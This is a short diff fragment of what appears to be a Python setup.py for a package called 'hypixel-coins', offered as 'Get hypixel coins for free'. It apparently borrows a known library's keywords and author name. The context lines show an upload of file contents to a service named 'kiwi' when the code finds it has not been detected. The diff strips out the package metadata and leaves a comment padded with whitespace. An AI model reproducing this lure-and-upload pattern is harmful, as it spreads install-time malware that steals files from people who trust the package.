@@ -681,16 +681,4 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-setup(
-
-    name='hypixel-coins',
-    packages=['hypixel-coins'],
-    version='1.0',
-    license='MIT',
-    description='Get hypixel coins for free',
-    author=' Jonathan Hartley',
-    keywords=['Colorama'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                          
